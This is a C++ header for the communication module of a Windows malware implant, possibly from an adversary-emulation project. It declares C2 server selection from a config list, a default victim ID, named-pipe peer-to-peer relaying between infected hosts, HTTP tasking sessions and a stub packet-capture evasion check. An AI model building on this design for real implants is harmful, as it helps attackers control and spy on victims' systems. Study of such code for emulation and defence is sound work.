#pragma once
#include <tuple>
#include <vector>
#include <memory>
#include "configFile.h"
#include "HttpClient.hpp"
#include "NamedPipeP2p.hpp"
#include "Tasks.hpp"
#include "Config.hpp"

#define FAIL_SETUP_P2P 0x1001
#define FAIL_ESTABLISH_SERVER_CONNECTION 0x1002
#define DEFAULT_VICTIM_UUID "120397517"

extern bool commLibTestingMode;

using networkAddress = std::tuple<std::string, int, std::string> ;
static const std::string replyStart = "<input";
static const std::string nameAssignmentHttp = "name=";
static const std::string valueAssignmentHttp = "value=";

class CommLib {
private:
    std::string configurationFileLocation;
    // These are variables fetched from configuration file.
    std::shared_ptr<ConfigMap> configParams = NULL;
    std::shared_ptr<networkAddress> c2ServerAddress; // Variable coming from CW_INET. Picked randomly from list.
    double c2ServerAddressLastUpdate = 0;
    unsigned int maxTransTime = 10;

    std::vector<std::shared_ptr<networkAddress>> GetNetworkAddresses(WinApiWrapperInterface* api_wrapper);

    // TODO in future task
    bool isPacketCaptureOnSystem(){ return false; };

public:
    bool p2pModeEnabled = FALSE;
    std::string localPipeAddress;
    std::string responsePipeAddress;
    std::string peerPipeAddress;
    std::string victimUuid = "";
    std::string resourcePath = "";
    HANDLE h_local_pipe = NULL;

    CommLib (std::string configFile);
    static DWORD WINAPI run(LPVOID lpParameter);
    bool FetchConfiguration(WinApiWrapperInterface* api_wrapper);
    bool p2pSetup(WinApiWrapperInterface* api_wrapper);
    std::shared_ptr<Task> convertP2pResponseToTask(std::vector<char> replyData);
    std::shared_ptr<HttpConnection> EstablishServerConnection(WinApiWrapperInterface* api_wrapper);
    std::shared_ptr<Task> EstablishServerSession(WinApiWrapperInterface* api_wrapper, std::shared_ptr<HttpConnection>, std::string uuid_override="");

    // Get a poperty defined in the configuration file.
    std::string getValueFromConfigFile(WinApiWrapperInterface* api_wrapper, std::string sectionName, std::string propertyName, std::string defaultValue = ""){
        static Mutex mutex{configMutex};
        Locker config_lock(mutex);

        // In the future, some values need to be updated on a regular basis.
        if (configParams == NULL){
            configParams = ParseConfigFile(api_wrapper, configurationFileLocation);
        }
        auto targetSection = configParams.get()->find(sectionName); 
        if (targetSection != configParams.get()->end() && targetSection->second.find(propertyName) != targetSection->second.end()){
            auto targetProperty = targetSection->second.find(propertyName);
            return targetProperty->second;
        }
        return defaultValue;
    };

    std::string getResourceForTaskReport() { return resourcePath; };
    
};

